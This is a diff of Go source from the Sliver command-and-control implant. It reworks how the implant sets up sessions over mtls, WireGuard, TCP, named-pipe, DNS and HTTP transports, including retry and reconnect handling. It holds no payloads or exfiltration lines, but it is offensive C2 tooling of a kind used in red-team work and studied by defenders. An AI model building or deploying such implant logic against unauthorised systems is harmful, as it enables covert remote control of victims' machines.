@@ -45,7 +45,7 @@ import (
 	// {{end}}
 
 	// {{if .Config.NamePipec2Enabled}}
-	"github.com/bishopfox/sliver/implant/sliver/transports/namedpipe"
+
 	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
@@ -64,7 +64,7 @@ type Connection interface {
 	RequestRecv() chan *pb.Envelope
 	RequestSend(*pb.Envelope)
 	RequestResend([]byte)
-	Cleanup()
+	Close() error
 
 	// Tunneling
 	Tunnel(ID uint64) *transports.Tunnel
@@ -79,27 +79,26 @@ func (t *C2) StartSession() (err error) {
 	// Maybe move this out of here
 	cryptography.OTPSecret = string(t.Profile.Credentials.TOTPServerSecret)
 
-ConnLoop:
 	for t.attempts < int(t.Profile.MaxConnectionErrors) {
 		switch t.uri.Scheme {
 
 		// Some protocols can count on a physical connection already being here.
-		case "mtls", "wg", "tcp":
+		// {{if or .Config.MTLSc2Enabled .Config.WGc2Enabled .Config.TCPc2Enabled .Config.NamePipec2Enabled}}
+		case "mtls", "wg", "tcp", "namedpipe", "pipe":
 			if t.Conn == nil {
 				return fmt.Errorf("Failed to create Connection: no physical connection in transport")
 			}
 			t.Connection, err = transports.SetupConnectionStream(t.Conn, t.cleanup)
-			break ConnLoop
+			// {{end}}
 
 		// Named pipes on Windows have additional Read & Write logic and error checks
 		// {{if .Config.NamePipec2Enabled}}
-		case "namedpipe":
-			if t.Conn == nil {
-				return fmt.Errorf("Failed to create Connection: no physical connection in transport")
-			}
-			t.Connection, err = namedpipe.SetupConnectionNamedPipe(t.Conn, t.cleanup)
-			// {{end}}
-			break ConnLoop
+		// case "namedpipe", "pipe":
+		//         if t.Conn == nil {
+		//                 return fmt.Errorf("Failed to create Connection: no physical connection in transport")
+		//         }
+		//         t.Connection, err = namedpipe.SetupConnectionNamedPipe(t.Conn, t.cleanup)
+		// {{end}}
 
 		// {{if .Config.DNSc2Enabled}}
 		case "dns":
@@ -108,31 +107,33 @@ ConnLoop:
 				// {{if .Config.Debug}}
 				log.Printf("[dns] Connection failed: %s", err)
 				// {{end}}
-				t.attempts++
+				t.FailedAttempt()
 				continue
 			}
-			break ConnLoop
 			// {{end}}
 
 		// {{if .Config.HTTPc2Enabled}}
 		case "https":
 			fallthrough
 		case "http":
-			t.Connection, err = httpclient.SetupConnectionHTTP(t.uri, t.Profile)
+			t.Connection, err = httpclient.SetupConnectionHTTP(t.uri, t.Profile, t.cleanup)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[%s] Connection failed: %s", t.uri.Scheme, err.Error())
 				// {{end}}
-				t.attempts++
+				t.FailedAttempt()
 				continue
 			}
-			break ConnLoop
 			// {{end}}
 		default:
 			// {{if .Config.Debug}}
 			log.Printf("Invalid C2 address sheme: %s", t.uri.Scheme)
 			// {{end}}
-			break ConnLoop // Avoid ConnLoop not used
+		}
+
+		// If the connection is set (and thus not nil), break and return
+		if t.Connection != nil {
+			break
 		}
 
 		// In case of failure to initiate a session, sleep
@@ -141,9 +142,10 @@ ConnLoop:
 		time.Sleep(transports.GetReconnectInterval())
 	}
 
-	// The logical connection should never be nil here.
+	// The logical connection should never be nil here, and that
+	// means we exhausted the max errors for this transport.
 	if t.Connection == nil {
-		return fmt.Errorf("Failed to connect over bind (listener) transport %d (%s)", t.ID, t.uri)
+		return fmt.Errorf("Failed to set up Session over transport %d (%s)", t.ID, t.uri)
 	}
 
 	return
@@ -162,7 +164,7 @@ func (t *C2) ServeSessionHandlers() {
 	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
 	sysHandlers := handlers.GetSystemHandlers()
-	sysPivotHandlers := handlers.GetSystemPivotHandlers()
+	sysPivotHandlers := handlers.GetSystemPivotHandlers() // TODO: remove this if needed
 	transportHandlers := handlers.GetSpecialHandlers()
 
 	for envelope := range connection.RequestRecv() {
@@ -170,7 +172,8 @@ func (t *C2) ServeSessionHandlers() {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] specialHandler %d", envelope.Type)
 			// {{end}}
-			handler(envelope.Data, t)
+			handler(envelope.Data, Transports)
+
 		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
